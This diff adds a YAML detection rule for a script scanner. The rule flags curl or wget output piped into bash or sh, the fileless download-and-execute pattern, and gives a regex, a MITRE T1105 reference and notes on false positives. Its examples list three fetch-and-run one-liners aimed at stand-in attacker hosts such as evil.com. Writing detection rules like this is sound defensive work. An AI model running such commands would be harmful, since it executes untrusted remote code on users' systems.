@@ -1,0 +1,37 @@
+# Bash Pattern: Curl/Wget Download and Execute
+# Detects download and execute patterns
+
+id: BASH-002
+name: Curl/Wget Download and Execute
+description: |
+  Detects patterns where curl or wget downloads content and pipes it directly to
+  bash or sh for execution. This is a common technique for downloading and running
+  malicious scripts without saving them to disk (fileless execution).
+  Note: This pattern has moderate FP risk as legitimate installers use this pattern.
+  Consider context - suspicious domains, IP addresses, or encoding raise confidence.
+languages:
+  - bash
+detection_type: regex
+detection_logic: '(?:\bcurl\b|\bwget\b)\s*.*\|\s*(?:\bbash\b|\bsh\b|/bin/bash|/bin/sh)'
+severity: Medium
+mitre_technique: T1105
+confidence: 0.55
+category: command_injection
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-15"
+  references:
+    - "https://attack.mitre.org/techniques/T1105/"
+  tags:
+    - bash
+    - download
+    - fileless
+  examples:
+    - "curl http://malicious.com/script.sh | bash"
+    - "wget -qO- http://evil.com/payload.sh | sh"
+    - "curl -s https://attacker.com/install.sh | /bin/bash"
